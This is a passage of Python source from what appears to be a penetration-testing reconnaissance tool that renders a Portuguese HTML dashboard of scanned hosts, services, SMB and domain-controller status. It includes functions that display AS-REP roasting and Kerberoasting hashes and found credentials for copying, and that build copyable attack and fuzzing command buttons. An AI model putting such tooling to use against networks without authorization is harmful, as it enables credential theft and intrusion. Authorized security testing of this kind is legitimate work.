            <div class="kv"><span>URLs WEB</span><strong>{h(reportable_urls)}</strong></div>
            <div class="kv"><span>Tipos de serviço</span><strong>{h(len(group_counts))}</strong></div>
            <div class="kv"><span>Portas únicas</span><strong>{h(unique_ports)}</strong></div>
            <div class="kv"><span>WEB priorizados</span><strong>{h(prioritized_web)}</strong></div>
          </div>
          <h3>Inventário por Tipo</h3>
          <div class="kv-grid">{''.join(group_rows)}</div>
        </div>
        <div class="panel">
          <h2>Pontos de Atenção</h2>
          {attention_html}
        </div>
      </div>
    """
    return overview


def discovered_local_domains(hosts: list[HostRecord]) -> list[str]:
    domains: list[str] = []
    for host in hosts:
        if host.domain:
            domains.append(host.domain.strip().strip(".").lower())
        for name in [host.fqdn, host.hostname, *host.aliases]:
            suffix = domain_suffix_from_hostname(name)
            if suffix:
                domains.append(suffix)
    return sorted(dedupe_text([domain for domain in domains if domain]))


def domain_suffix_from_hostname(value: str) -> str:
    name = (value or "").strip().strip(".").lower()
    if not name or "." not in name:
        return ""
    try:
        ipaddress.ip_address(name)
        return ""
    except ValueError:
        pass
    labels = [label for label in name.split(".") if label]
    if len(labels) >= 3:
        return ".".join(labels[1:])
    if len(labels) == 2:
        return ".".join(labels)
    return ""


def detect_dc_ips(state: ScanState) -> list[str]:
    kerb_ips = {s.ip for s in state.services if s.port in KERBEROS_PORTS or "kerberos" in (s.service or "").lower()}
    ldap_ips = {s.ip for s in state.services if s.port in LDAP_PORTS or "ldap" in (s.service or "").lower()}
    return sorted(kerb_ips & ldap_ips, key=ip_sort_key)


def domain_summary_html(domains: list[str], state: ScanState) -> str:
    dc_ips = detect_dc_ips(state)
    dc_html = f'<div style="margin-top:4px"><span class="pill sev-low">DCs: {", ".join(dc_ips)}</span></div>' if dc_ips else ""
    
    if not domains:
        return h("-") + dc_html
    shown = domains[:8]
    extra = len(domains) - len(shown)
    extra_html = f'<span class="pill">+{h(extra)}</span>' if extra > 0 else ""
    return pill_list(shown) + extra_html + dc_html


def overview_charts(hosts: list[HostRecord], services: list[ServiceRecord], endpoints: list[WebEndpoint]) -> str:
    group_counts = service_group_counts(services)
    status_counts = http_status_counts(endpoints)
    host_ports = host_port_quantity_counts(services)
    top_services = top_exposed_service_counts(services)
    return (
        '<div class="chart-grid">'
        f'{pie_chart("Serviços por Tipo", group_counts)}'
        f'{pie_chart("Status HTTP", status_counts)}'
        f'{horizontal_bar_chart("Host x porta x quantidade", host_ports, limit=10)}'
        f'{horizontal_bar_chart("Top 10 serviços expostos", top_services, limit=10)}'
        "</div>"
    )


def kerberos_attacks_summary_html(state: ScanState) -> str:
    raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "kerberos"
    if not raw_dir.exists():
        return ""
    
    asrep_files = list(raw_dir.glob("asrep_hashes_*.txt"))
    kerberoast_files = list(raw_dir.glob("kerberoast_hashes_*.txt"))
    if not asrep_files and not kerberoast_files:
        return ""
        
    html_parts = []
    
    def process_files(files: list[Path], title: str) -> str:
        content_lines = []
        download_links = []
        for f in files:
            text = f.read_text(encoding="utf-8", errors="replace").strip()
            # Filter valid hashcat hashes (containing $krb5)
            hashes = [line for line in text.splitlines() if "$krb5" in line]
            if hashes:
                content_lines.extend(hashes)
                dl_path = relpath(str(f), state.output_dir)
                download_links.append(f'<a href="{h(dl_path)}" download="{h(f.name)}" class="pill sev-medium">📥 {h(f.name)} ({len(hashes)} hashes)</a>')
        
        if not content_lines:
            return ""
            
        all_hashes = "\n".join(dedupe_text(content_lines))
        return (
            f"<h3>{h(title)}</h3>"
            f"<div style='margin-bottom:8px'>{''.join(download_links)}</div>"
            f'<div class="code-block-container">'
            f'<pre class="enum-data" style="max-height:120px">{h(all_hashes)}</pre>'
            f'<button class="copy-btn" data-copy-value="{h(all_hashes)}">Copiar</button>'
            f'</div>'
        )
        
    asrep_html = process_files(asrep_files, "AS-REP Roasting")
    kerberoast_html = process_files(kerberoast_files, "Kerberoasting")
    
    if not asrep_html and not kerberoast_html:
        return ""
        
    return (
        '<div class="panel">'
        '<h2>Kerberos Attacks</h2>'
        f'{asrep_html}'
        f'{kerberoast_html}'
        '</div>'
    )


def bar_chart(title: str, values: dict[str, int], order: list[str] | None = None) -> str:
    return horizontal_bar_chart(title, values, order=order)


def pie_chart(title: str, values: dict[str, int], order: list[str] | None = None, limit: int = 10) -> str:
    if order:
        items = [(key, values.get(key, 0)) for key in order if values.get(key, 0)]
    else:
        items = sorted(values.items(), key=lambda item: (-item[1], service_chart_rank(item[0]), item[0]))[:limit]
    if not items:
        return f'<div class="chart"><h3>{h(title)}</h3>{empty_state("Sem dados para este gráfico.")}</div>'
    total = sum(value for _, value in items) or 1
    start = 0.0
    segments: list[str] = []
    legend_rows: list[str] = []
    for index, (label, value) in enumerate(items):
        percent = (value / total) * 100
        end = start + percent
        color = chart_color(label, index)
        percent_label = f"{percent:.0f}%"
        segments.append(f"{color} {start:.2f}% {end:.2f}%")
        legend_rows.append(
            '<div class="legend-row">'
            f'<span class="legend-label"><i class="legend-swatch" style="background:{h(color)}"></i>{h(label)}</span>'
            f'<span>{h(value)} <span class="muted">{h(percent_label)}</span></span>'
            "</div>"
        )
        start = end
    donut_style = "background: conic-gradient(" + ", ".join(segments) + ");"
    return (
        f'<div class="chart"><h3>{h(title)}</h3>'
        '<div class="pie-chart">'
        f'<div class="pie-donut" style="{h(donut_style)}"></div>'
        f'<div class="chart-legend">{"".join(legend_rows)}</div>'
        "</div></div>"
    )


def horizontal_bar_chart(
    title: str,
    values: dict[str, int],
    order: list[str] | None = None,
    limit: int = 10,
) -> str:
    if order:
        items = [(key, values.get(key, 0)) for key in order if values.get(key, 0)]
    else:
        items = sorted(values.items(), key=lambda item: (-item[1], service_chart_rank(item[0]), item[0]))[:limit]
    if not items:
        return f'<div class="chart"><h3>{h(title)}</h3>{empty_state("Sem dados para este gráfico.")}</div>'
    max_value = max(value for _, value in items) or 1
    rows = [f'<div class="chart"><h3>{h(title)}</h3><div class="hbar-list">']
    for index, (label, value) in enumerate(items):
        width = max(4, int((value / max_value) * 100))
        color = chart_color(label, index)
        rows.append(
            '<div class="hbar-row">'
            f'<span class="hbar-label">{h(label)}</span>'
            f'<div class="hbar-track"><div class="hbar-fill" style="width:{h(width)}%; background:{h(color)}"></div></div>'
            f'<strong>{h(value)}</strong>'
            "</div>"
        )
    rows.append("</div></div>")
    return "\n".join(rows)


def http_status_counts(endpoints: list[WebEndpoint]) -> dict[str, int]:
    counts: dict[str, int] = {}
    for endpoint in endpoints:
        if not is_reportable_web_endpoint(endpoint):
            continue
        key = str(endpoint.status_code)
        counts[key] = counts.get(key, 0) + 1
    return counts


def host_port_quantity_counts(services: list[ServiceRecord]) -> dict[str, int]:
    services_by_host = group_services_by_host(services)
    rows: list[tuple[str, int, str]] = []
    for ip, items in services_by_host.items():
        ports = dedupe_text(str(service.port) for service in sorted(items, key=lambda item: (item.port, item.protocol)))
        suffix = ", ".join(ports[:5])
        if len(ports) > 5:
            suffix += f", +{len(ports) - 5}"
        label = f"{ip} | {suffix}" if suffix else ip
        rows.append((label, len(items), ip))
    rows.sort(key=lambda item: (-item[1], ip_sort_key(item[2])))
    return {label: count for label, count, _ in rows[:10]}


def top_exposed_service_counts(services: list[ServiceRecord]) -> dict[str, int]:
    counts = service_group_counts(services)
    items = sorted(counts.items(), key=lambda item: (-item[1], service_chart_rank(item[0]), item[0]))[:10]
    return dict(items)


def chart_color(label: str, index: int = 0) -> str:
    semantic = {
        "DATABASE/DATA": "#ef4444",
        "CONTAINER": "#f97316",
        "TELNET": "#fb7185",
        "WINRM": "#f59e0b",
        "RDP": "#fbbf24",
        "SMB": "#fde047",
        "LDAP/AD": "#22c55e",
        "KERBEROS": "#10b981",
        "NFS/RPC": "#14b8a6",
        "SNMP": "#2dd4bf",
        "VNC": "#60a5fa",
        "FTP": "#38bdf8",
        "SSH": "#3b82f6",
        "WEB": "#a78bfa",
        "DNS": "#818cf8",
        "MAIL": "#f472b6",
        "OTHER": "#64748b",
        "200": "#10b981",
        "201": "#22c55e",
        "202": "#34d399",
        "204": "#14b8a6",
        "301": "#38bdf8",
        "302": "#60a5fa",
        "307": "#818cf8",
        "308": "#a78bfa",
        "401": "#fbbf24",
        "403": "#f97316",
    }
    normalized = str(label).upper()
    if normalized in semantic:
        return semantic[normalized]
    palette = ["#38bdf8", "#3b82f6", "#10b981", "#fbbf24", "#a78bfa", "#f472b6", "#14b8a6", "#f97316"]
    return palette[index % len(palette)]


def service_chart_rank(label: str) -> int:
    order = [
        "DATABASE/DATA",
        "CONTAINER",
        "TELNET",
        "WINRM",
        "RDP",
        "SMB",
        "LDAP/AD",
        "KERBEROS",
        "NFS/RPC",
        "SNMP",
        "VNC",
        "FTP",
        "SSH",
        "WEB",
        "DNS",
        "MAIL",
        "OTHER",
    ]
    normalized = str(label).upper()
    if normalized in order:
        return order.index(normalized)
    return len(order)


def service_group_counts(services: list[ServiceRecord]) -> dict[str, int]:
    counts: dict[str, int] = {}
    for service in services:
        group = service_group_name(service)
        counts[group] = counts.get(group, 0) + 1
    return counts


def host_group_dashboard(
    hosts: list[HostRecord],
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    evidence: list[Evidence],
    state: ScanState,
) -> str:
    if not hosts:
        return empty_state("Nenhum host catalogado.")
    services_by_host = group_services_by_host(services)
    endpoints_by_host = group_web_by_host(endpoints)
    evidence_by_host = group_evidence_by_host(evidence)
    rows: list[str] = ['<div class="group-list">']
    for host in hosts:
        host_services = services_by_host.get(host.ip, [])
        host_endpoints = endpoints_by_host.get(host.ip, [])
        host_evidence = evidence_by_host.get(host.ip, [])
        hostname = host.hostname or host.fqdn or "-"
        service_groups = sorted({service_group_name(service) for service in host_services})
        filter_text = row_filter(
            host.ip,
            hostname,
            host.aliases,
            host.domain,
            host.os_guess,
            service_groups,
            [service.service for service in host_services],
            [endpoint.url for endpoint in host_endpoints],
            [item.title for item in host_evidence],
        )
        rows.append(
            f'<details class="group-item" data-filter="{filter_text}">'
            "<summary>"
            f'<span class="summary-title"><span class="mono">{h(host.ip)}</span><strong>{h(hostname)}</strong></span>'
            '<span class="summary-pills">'
            f'{metric_pill("portas", len(host_services))}'
            f'{metric_pill("web", len(host_endpoints))}'
            f'{metric_pill("evidências", len(host_evidence))}'
            f'{pill_list(service_groups[:6])}'
            "</span>"
            "</summary>"
            '<div class="group-body">'
            '<div class="kv-grid">'
            f'<div class="kv"><span>Aliases</span><div>{pill_list(host.aliases) or h("-")}</div></div>'
            f'<div class="kv"><span>Domínio</span><strong>{h(host.domain or "-")}</strong></div>'
            f'<div class="kv"><span>OS Guess</span><div>{h(host.os_guess or "-")}</div></div>'
            f'<div class="kv"><span>Ações</span><div>{copy_value_button("Copiar IP", host.ip)}{copy_value_button("Copiar hostnames", chr(10).join([host.hostname, host.fqdn, *host.aliases]).strip())}</div></div>'
            "</div>"
            "<h3>Portas e Serviços</h3>"
            f"{port_details_list(host_services, host_endpoints, host_evidence, state)}"
            "</div>"
            "</details>"
        )
    rows.append("</div>")
    return "\n".join(rows)


def service_group_dashboard(
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    evidence: list[Evidence],
    state: ScanState,
) -> str:
    groups = group_services_by_type(services)
    if not groups:
        return empty_state("Nenhum serviço catalogado.")
    endpoints_by_host_port = group_web_by_host_port(endpoints)
    evidence_by_host = group_evidence_by_host(evidence)
    rows: list[str] = ['<div class="group-list">']
    for group_name, group_services in sorted(groups.items(), key=lambda item: (-len(item[1]), item[0])):
        all_group_services = group_services
        display_services = preferred_smb_services(state, group_services) if group_name == "SMB" else group_services
        hosts = sorted({service.ip for service in display_services}, key=ip_sort_key)
        group_endpoints = [
            endpoint
            for service in display_services
            for endpoint in endpoints_by_host_port.get((service.ip, service.port), [])
        ]
        group_evidence = [
            item
            for host in hosts
            for item in evidence_by_host.get(host, [])
            if evidence_matches_service_group(item, group_name, all_group_services)
        ]
        group_enum_evidence = [item for item in group_evidence if not is_group_enum_noise_evidence(item)]
        filter_text = row_filter(
            group_name,
            hosts,
            [service.service for service in display_services],
            [service.port for service in display_services],
            [endpoint.url for endpoint in group_endpoints],
        )
        rows.append(
            f'<details class="group-item" data-filter="{filter_text}" data-service="{h(group_name)}">'
            "<summary>"
            f'<span class="summary-title"><strong>{h(group_name)}</strong></span>'
            '<span class="summary-pills">'
            f'{metric_pill("hosts", len(hosts))}'
            f'{metric_pill("serviços", len(display_services))}'
            f'{metric_pill("web", len(group_endpoints))}'
            f'{metric_pill("evidências", len(group_enum_evidence))}'
            "</span>"
            "</summary>"
            '<div class="group-body">'
            f"{service_group_actions(group_name, display_services, state)}"
            f"{service_group_body(group_name, display_services, group_endpoints, endpoints_by_host_port, state)}"
            f"{enumeration_details_block(group_enum_evidence, state, title='Informações de Enumeração do Grupo')}"
            "</div>"
            "</details>"
        )
    rows.append("</div>")
    return "\n".join(rows)


def service_group_body(
    group_name: str,
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    endpoints_by_host_port: dict[tuple[str, int], list[WebEndpoint]],
    state: ScanState,
) -> str:
    if group_name == "WEB":
        return web_service_group_dashboard(services, endpoints, state)
    if group_name == "SMB":
        return smb_service_group_table(services, endpoints_by_host_port, state) + smb_structured_summary_html(services, state)
    if group_name == "KERBEROS":
        return kerberos_service_group_table(services, endpoints_by_host_port, state)
    return service_group_table(services, endpoints_by_host_port, state)


def service_group_actions(group_name: str, services: list[ServiceRecord], state: ScanState) -> str:
    targets = service_group_targets(services)
    if not targets:
        return ""
    command_buttons = service_group_command_buttons(services, state)
    return (
        '<div class="service-group-actions">'
        f'<span class="muted">{h(group_name)}: {h(len(targets))} alvo(s) ativo(s)</span>'
        f'<div class="copy-actions">{copy_commands_button("Copiar IP:porta", targets)}{copy_commands_button("Copiar IPs", service_group_ips(services))}{command_buttons}</div>'
        "</div>"
    )


def service_group_command_buttons(services: list[ServiceRecord], state: ScanState) -> str:
    sorted_services = sorted_services_unique(services)
    commands_by_tool: dict[str, list[tuple[ServiceRecord, list[tuple[str, str]]]]] = {}
    for service in sorted_services:
        for tool, commands in service_primary_commands_by_tool(service, state).items():
            if tool == "NTLM Relay ⚠️":
                continue
            commands_by_tool.setdefault(tool, []).append((service, commands))
    buttons: list[str] = []
    for tool, entries in commands_by_tool.items():
        if tool == "AS-REP Roasting":
            commands_list = [cmd for _, service_commands in entries for _, cmd in service_commands]
            buttons.append(copy_commands_button(f"AS-REP Roasting ({len(dedupe_text(commands_list))})", dedupe_text(commands_list)))
            continue
        tool_services = [service for service, commands in entries if commands]
        if len(tool_services) > 1:
            loop_command = service_tool_loop_command(tool, tool_services, state)
            if loop_command:
                buttons.append(copy_commands_button(tool, [loop_command]))
                continue
        commands_list: list[str] = []
        for _, service_commands in entries:
            commands_list.extend(cmd for _, cmd in service_commands)
        buttons.append(copy_commands_button(tool, dedupe_text(commands_list), loop_multiple=True))
    return "".join(buttons)


def service_group_targets(services: list[ServiceRecord]) -> list[str]:
    values = [
        host_port_value(service.ip, service.port)
        for service in sorted(services, key=lambda item: (ip_sort_key(item.ip), item.port, item.protocol))
    ]
    return dedupe_text(values)


def service_group_ips(services: list[ServiceRecord]) -> list[str]:
    return dedupe_text(service.ip for service in sorted(services, key=lambda item: (ip_sort_key(item.ip), item.port, item.protocol)))


def service_tool_loop_command(tool: str, services: list[ServiceRecord], state: ScanState) -> str:
    unique_services = sorted_services_unique(services)
    commands: list[str] = []
    for service in unique_services:
        service_commands = service_primary_commands_by_tool(service, state)
        if tool in service_commands and service_commands[tool]:
            commands.extend(cmd for _, cmd in service_commands[tool])
    if not commands:
        return ""
    log_file = f"birdscan-{safe_filename(tool.lower())}-all-targets.txt"
    return shell_for_loop_for_commands(commands, log_file=log_file)


def host_port_value(ip: str, port: int) -> str:
    if ":" in ip and not ip.startswith("["):
        return f"[{ip}]:{port}"
    return f"{ip}:{port}"


def web_service_group_dashboard(
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    state: ScanState,
) -> str:
    custom_wordlist = dashboard_custom_wordlist(state)
    thread_count = dashboard_dirsearch_threads(state)
    roots = active_web_roots_for_services(services, state.web_endpoints)
    catalog_endpoints = web_catalog_endpoints(services, endpoints)
    root_count = len(root_urls_for_items(roots))
    return "\n".join(
        [
            '<div class="panel">',
            "<h2>Fuzzing Global WEB</h2>",
            f'<div class="muted">Comandos para {h(root_count)} raiz(es) única(s) de todas as portas WEB deste grupo.</div>',
            global_fuzz_buttons(roots, custom_wordlist, thread_count=thread_count),
            "</div>",
            web_fuzz_by_ip_panel(roots, custom_wordlist, thread_count),
            "<h3>Catálogo WEB Completo</h3>",
            web_endpoints_by_status(catalog_endpoints, state, custom_wordlist, include_unreported=True),
            "<h3>Portas WEB</h3>",
            web_ports_table(services, state),
        ]
    )


def prioritized_web_endpoints(endpoints: list[WebEndpoint], state: ScanState) -> list[WebEndpoint]:
    evidence_urls = {
        str(item.data.get("url"))
        for item in state.evidence
        if item.category == "web" and item.data.get("url")
    }
    return [endpoint for endpoint in endpoints if endpoint.interesting or endpoint.url in evidence_urls]


def web_endpoints_by_status(
    endpoints: list[WebEndpoint],
    state: ScanState,
    custom_wordlist: str,
    include_unreported: bool = False,
) -> str:
    grouped: dict[int, list[WebEndpoint]] = {}
    for endpoint in endpoints:
        if is_reportable_web_endpoint(endpoint) or (include_unreported and endpoint.status_code == 0 and is_valid_web_url(endpoint.url)):
            grouped.setdefault(endpoint.status_code, []).append(endpoint)
    if not grouped:
        return empty_state("Nenhum endpoint web válido catalogado.")
    rows = ['<div class="group-list web-status-list">']
    for status_code in sorted(grouped, key=lambda code: (code == 0, code)):
        status_endpoints = sorted(grouped[status_code], key=lambda item: (ip_sort_key(item.ip), item.port, item.url))
        status_label = "Sem status" if status_code == 0 else str(status_code)
        rows.append(
            f'<details class="group-item web-status-group" data-filter="{row_filter(status_label, [endpoint.url for endpoint in status_endpoints])}" '
            f'data-code="{h(status_code)}" data-service="WEB">'
            "<summary>"
            f'<span class="summary-title"><span class="mono">{h(status_label)}</span><strong>Status HTTP</strong></span>'
            '<span class="summary-pills">'
            f'{metric_pill("urls", len(status_endpoints))}'
            f'{metric_pill("hosts", len({endpoint.ip for endpoint in status_endpoints}))}'
            "</span>"
            "</summary>"
            '<div class="group-body">'
            '<div class="web-list">'
            f"{web_endpoint_header()}"
            f"{''.join(web_endpoint_line(endpoint, state, custom_wordlist=custom_wordlist) for endpoint in status_endpoints)}"
            "</div>"
            "</div>"
            "</details>"
        )
    rows.append("</div>")
    return "\n".join(rows)


def web_endpoint_header() -> str:
    return (
        '<div class="web-row-head">'
        "<div>Status</div>"
        "<div>URL</div>"
        "<div>Porta</div>"
        "<div>Título</div>"
        "<div>Resposta</div>"
        "<div>Fuzzing</div>"
        "</div>"
    )


def dashboard_dirsearch_threads(state: ScanState) -> int:
    level = parse_int(state.metadata.get("threads_level", 2))
    return int(THREAD_LEVELS.get(level, THREAD_LEVELS[2])["workers"])


def web_fuzz_by_ip_panel(roots: list[WebRoot], custom_wordlist: str, thread_count: int) -> str:
    grouped: dict[str, list[WebRoot]] = {}
    for root in roots:
        grouped.setdefault(root.ip, []).append(root)
    if not grouped:
        return empty_state("Nenhuma raiz WEB catalogada para fuzzing por IP.")
    rows = ['<div class="web-fuzz-ip-list">']
    for ip in sorted(grouped, key=ip_sort_key):
        host_roots = grouped[ip]
        if not host_roots:
            continue
        rows.append(
            f'<div class="web-fuzz-ip-row" data-filter="{row_filter(ip, [root.url for root in host_roots])}" data-service="WEB">'
            f'<span class="summary-title"><span class="mono">{h(ip)}</span></span>'
            f'<span class="summary-pills">{metric_pill("portas", len(host_roots))}{metric_pill("raízes", len(root_urls_for_items(host_roots)))}</span>'
            f'{global_fuzz_buttons(host_roots, custom_wordlist, thread_count=thread_count)}'
            "</div>"
        )
    rows.append("</div>")
    body = "\n".join(rows)
    return (
        '<details class="table-section web-fuzz-ip-section">'
        f'<summary>Fuzzing por IP <span class="metric"><strong>{h(len(grouped))}</strong>hosts</span>'
        f'<span class="metric"><strong>{h(len(root_urls_for_items(roots)))}</strong>raízes</span></summary>'
        f'<div class="table-section-body">{body}</div>'
        "</details>"
    )


def web_ports_table(services: list[ServiceRecord], state: ScanState) -> str:
    if not services:
        return empty_state("Nenhuma porta WEB catalogada.")
    rows = [
        '<div class="table-wrap"><table><thead><tr><th>Host</th><th>Porta</th><th>Serviço</th><th>Produto</th><th>Interação</th></tr></thead><tbody>'
    ]
    for service in sorted(services, key=lambda item: (ip_sort_key(item.ip), item.port)):
        host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
        hostname = host.hostname or host.fqdn
        rows.append(
            f'<tr data-filter="{row_filter(service.ip, hostname, service.port, service.protocol, service.service, service.product, service.version)}" '
            f'data-service="{h(service.service or service_group_name(service))}">'
            f'<td><span class="mono">{h(service.ip)}</span><br><span class="muted">{h(hostname)}</span></td>'
            f'<td class="mono nowrap">{h(service.port)}/{h(service.protocol)}</td>'
            f"<td>{h(service.service or service_group_name(service))}</td>"
            f"<td>{h(service_descriptor(service) or '-')}</td>"
            f"<td>{service_interaction_buttons(service, state)}</td>"
            "</tr>"
        )
    rows.append("</tbody></table></div>")
    return "\n".join(rows)


def web_endpoint_line(endpoint: WebEndpoint, state: ScanState, custom_wordlist: str = "") -> str:
    title = endpoint.title or endpoint.server or "-"
    response_parts = [
        f'<span class="metric"><strong>{h(endpoint_size_label(endpoint))}</strong>tamanho</span>',
    ]
    if endpoint.content_type:
        response_parts.append(f'<span class="pill">{h(endpoint.content_type)}</span>')
    if endpoint.server:
        response_parts.append(f'<span class="pill">{h(endpoint.server)}</span>')
    tech_html = pill_list(endpoint.technologies[:5])
    if tech_html:
        response_parts.append(tech_html)
    response_parts.append(raw_link(endpoint.raw_headers_file, state))
    return (
        f'<div class="web-item" data-filter="{row_filter(endpoint.status_code, endpoint.url, endpoint.title, endpoint.server, endpoint.content_type, endpoint.technologies, endpoint.response_size, endpoint.content_length)}" '
        f'data-code="{h(endpoint.status_code)}" data-service="WEB">'
        '<div class="web-line">'
        f'<div class="web-col"><span class="web-col-label">Status</span><span class="mono">{h(endpoint.status_code)}</span></div>'
        f'<div class="web-col web-url"><span class="web-col-label">URL</span>{web_url_link(endpoint.url)}</div>'
        f'<div class="web-col"><span class="web-col-label">Porta</span><span class="metric"><strong>{h(endpoint.port)}</strong>porta</span><span class="metric"><strong>WEB</strong>serviço</span></div>'
        f'<div class="web-col"><span class="web-col-label">Título</span>{web_title_html(endpoint, state, title)}</div>'
        f'<div class="web-col"><span class="web-col-label">Resposta</span><span class="web-meta">{"".join(response_parts)}</span></div>'
        f'<div class="web-col"><span class="web-col-label">Fuzzing</span>{fuzz_tool_buttons(endpoint.url, custom_wordlist=custom_wordlist, thread_count=dashboard_dirsearch_threads(state))}</div>'
        "</div>"
        "</div>"
    )


def web_title_html(endpoint: WebEndpoint, state: ScanState, title: str) -> str:
    favicon = favicon_img_html(endpoint, state)
    return f'<span class="web-title">{favicon}<span>{h(title)}</span></span>'


def favicon_img_html(endpoint: WebEndpoint, state: ScanState) -> str:
    if not endpoint.favicon_file:
        return ""
    candidate = Path(state.output_dir) / endpoint.favicon_file
    if not candidate.exists():
        return ""
    return f'<img class="favicon-img" src="{h(endpoint.favicon_file)}" alt="">'


def port_details_list(
    services: list[ServiceRecord],
    endpoints: list[WebEndpoint],
    evidence: list[Evidence],
    state: ScanState,
) -> str:
    if not services:
        return empty_state("Nenhuma porta aberta catalogada para este host.")
    
    auth_creds = detect_auth_credentials_from_evidence(state)
    endpoints_by_port: dict[tuple[int, str], list[WebEndpoint]] = {}
    for endpoint in endpoints:
        endpoints_by_port.setdefault((endpoint.port, "tcp"), []).append(endpoint)
    evidence_by_port: dict[int | None, list[Evidence]] = {}
    for item in evidence:
        evidence_by_port.setdefault(item.port, []).append(item)
    rows = ['<div class="port-list">']
    for service in sorted(services, key=lambda item: (item.port, item.protocol)):
        service_endpoints = endpoints_by_port.get((service.port, service.protocol), [])
        service_evidence = evidence_by_port.get(service.port, [])
        descriptor = service_descriptor(service)
        descriptor_html = f'<span class="muted">{h(descriptor)}</span>' if descriptor else ""
        group = service_group_name(service)
        filter_text = row_filter(service.ip, service.port, service.protocol, service.service, descriptor, group, [endpoint.url for endpoint in service_endpoints])
        creds = auth_creds.get((service.ip, service.port), [])
        if not creds:
            auth_html = '<span class="muted">-</span>'
        elif len(creds) == 1:
            auth_html = f'<span class="pill sev-low">{h(creds[0]["label"])}</span>'
        else:
            options = "".join(f'<li style="margin-bottom:4px"><span class="pill sev-low">{h(c["label"])}</span></li>' for c in creds)
            auth_html = f'<details class="inline-web-list"><summary>{len(creds)} credenciais</summary><ul class="evidence-list" style="margin-top:5px;padding-left:0;list-style-type:none;">{options}</ul></details>'

        rows.append(
            f'<details class="port-item" data-filter="{filter_text}" data-service="{h(service.service or group)}">'
            "<summary>"
            f'<span class="summary-title"><span class="mono">{h(service.port)}/{h(service.protocol)}</span><strong>{h(service.service or group)}</strong>{descriptor_html}</span>'
            '<span class="summary-pills">'
            f'{pill_list([group])}'
            f'{metric_pill("web", len(service_endpoints))}'
            f'{metric_pill("evidências", len(service_evidence))}'
            "</span>"
            "</summary>"
            '<div class="group-body">'
            '<div class="kv-grid">'
            f'<div class="kv"><span>Produto</span><div>{h(service.product or "-")}</div></div>'
            f'<div class="kv"><span>Versão/Banner</span><div>{h(service.version or service.banner or "-")}</div></div>'
            f'<div class="kv"><span>Auth</span><div>{auth_html}</div></div>'
            f'<div class="kv"><span>Interação</span><div>{service_interaction_buttons(service, state)}</div></div>'
            "</div>"
            f"{web_links_block(service_endpoints, state)}"
            f"{evidence_compact_list(service_evidence)}"
            f"{enumeration_details_block(service_evidence, state)}"
            "</div>"
            "</details>"
        )
    rows.append("</div>")
    return "\n".join(rows)


def service_group_table(
    services: list[ServiceRecord],
    endpoints_by_host_port: dict[tuple[str, int], list[WebEndpoint]],
    state: ScanState,
) -> str:
    auth_creds = detect_auth_credentials_from_evidence(state)
    dc_ips = detect_dc_ips(state)
    rows = [
        '<div class="table-wrap"><table><thead><tr><th>Host</th><th>Porta</th><th>Serviço</th><th>Produto</th><th>Auth</th><th>Web</th><th>Interação</th></tr></thead><tbody>'
    ]
    
    def service_sort_key(item: ServiceRecord):
        return (0 if item.ip in dc_ips else 1, ip_sort_key(item.ip), item.port)
        
    for service in sorted(services, key=service_sort_key):
        host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
        hostname = host.hostname or host.fqdn
        service_endpoints = endpoints_by_host_port.get((service.ip, service.port), [])
        endpoint_links = " ".join(endpoint.url for endpoint in service_endpoints)
        endpoint_links_html = web_dropdown_for_service(service_endpoints, state)
        creds = auth_creds.get((service.ip, service.port), [])
        if not creds:
            auth_html = '<span class="muted">-</span>'
        elif len(creds) == 1:
            auth_html = f'<span class="pill sev-low">{h(creds[0]["label"])}</span>'
        else:
            options = "".join(f'<li style="margin-bottom:4px"><span class="pill sev-low">{h(c["label"])}</span></li>' for c in creds)
            auth_html = f'<details class="inline-web-list"><summary>{len(creds)} credenciais</summary><ul class="evidence-list" style="margin-top:5px;padding-left:0;list-style-type:none;">{options}</ul></details>'
        tr_class = "dc-host" if service.ip in dc_ips else ""
        rows.append(
            f'<tr class="{tr_class}" data-filter="{row_filter(service.ip, hostname, service.port, service.protocol, service.service, service.product, service.version, endpoint_links)}" '
            f'data-service="{h(service.service or service_group_name(service))}">'
            f'<td><span class="mono">{h(service.ip)}</span><br><span class="muted">{h(hostname)}</span></td>'
            f'<td class="mono nowrap">{h(service.port)}/{h(service.protocol)}</td>'
            f"<td>{h(service.service or service_group_name(service))}</td>"
            f"<td>{h(service_descriptor(service) or '-')}</td>"
            f"<td>{auth_html}</td>"
            f"<td>{endpoint_links_html}</td>"
            f"<td>{service_interaction_buttons(service, state)}</td>"
            "</tr>"
        )
    rows.append("</tbody></table></div>")
    return "\n".join(rows)


def smb_service_group_table(
    services: list[ServiceRecord],
    endpoints_by_host_port: dict[tuple[str, int], list[WebEndpoint]],
    state: ScanState,
) -> str:
    """Render SMB service group table with SMBv1, Auth and Shares status columns."""
    smbv1_status = detect_smbv1_status_from_evidence(state)
    auth_creds = detect_auth_credentials_from_evidence(state)
    auth_by_endpoint = smb_enum_credentials_by_endpoint(state)
    shares_status = detect_smb_shares_from_evidence(state)
    dc_ips = detect_dc_ips(state)
    rows = [
        '<div class="table-wrap"><table><thead><tr><th>Host</th><th>Porta</th><th>Serviço</th><th>Produto</th><th>SMBv1</th><th>Auth</th><th>Shares</th><th>Web</th><th>Interação</th></tr></thead><tbody>'
    ]
    
    def service_sort_key(item: ServiceRecord):
        return (0 if item.ip in dc_ips else 1, ip_sort_key(item.ip), item.port)
        
    for service in sorted(services, key=service_sort_key):
        host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
        hostname = host.hostname or host.fqdn
        service_endpoints = endpoints_by_host_port.get((service.ip, service.port), [])
        endpoint_links = " ".join(endpoint.url for endpoint in service_endpoints)
        endpoint_links_html = web_dropdown_for_service(service_endpoints, state)
        smbv1_key = (service.ip, service.port)
        smbv1_enabled = smbv1_status.get(smbv1_key, None)
        if smbv1_enabled is True:
            smbv1_html = '<span class="sev-high" style="font-weight:800">⚠ TRUE</span>'
        elif smbv1_enabled is False:
            smbv1_html = '<span class="muted">False</span>'
        else:
            smbv1_html = '<span class="muted">-</span>'
        creds = auth_by_endpoint.get(smbv1_key, (service, auth_creds.get(smbv1_key, [])))[1]
        if not creds:
            auth_html = '<span class="muted">-</span>'
        elif len(creds) == 1:
            auth_html = f'<span class="sev-medium" style="font-weight:800">✓ {h(creds[0]["label"])}</span>'
        else:
